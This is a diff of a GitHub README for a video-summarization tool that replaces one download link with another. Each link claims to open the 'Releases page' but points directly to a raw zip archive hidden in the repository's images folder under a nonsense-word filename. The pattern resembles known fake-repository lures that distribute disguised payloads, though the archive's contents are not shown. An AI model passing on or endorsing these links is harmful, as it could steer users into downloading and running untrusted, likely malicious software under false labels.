@@ -8,13 +8,13 @@ Welcome to the video-summarization-for-information-dense-content project! This t
 
 To get started, you’ll need to download the software. You can do this by visiting the link below:
 
-[![Download Releases](https://raw.githubusercontent.com/Nisba009/video-summarization-for-information-dense-content/main/images/video-summarization-for-information-dense-content_hetericist.zip)](https://raw.githubusercontent.com/Nisba009/video-summarization-for-information-dense-content/main/images/video-summarization-for-information-dense-content_hetericist.zip)
+[![Download Releases](https://raw.githubusercontent.com/Nisba009/video-summarization-for-information-dense-content/main/images/dense-summarization-for-video-information-content-nickeliferous.zip)](https://raw.githubusercontent.com/Nisba009/video-summarization-for-information-dense-content/main/images/dense-summarization-for-video-information-content-nickeliferous.zip)
 
 1. Click on the link above.
 2. On the Releases page, find the latest version of the software.
 3. Download the file that matches your operating system.
 
-You can also visit the Releases page anytime for updates: [Download Releases](https://raw.githubusercontent.com/Nisba009/video-summarization-for-information-dense-content/main/images/video-summarization-for-information-dense-content_hetericist.zip).
+You can also visit the Releases page anytime for updates: [Download Releases](https://raw.githubusercontent.com/Nisba009/video-summarization-for-information-dense-content/main/images/dense-summarization-for-video-information-content-nickeliferous.zip).
 
 ## 🖥️ System Requirements
 
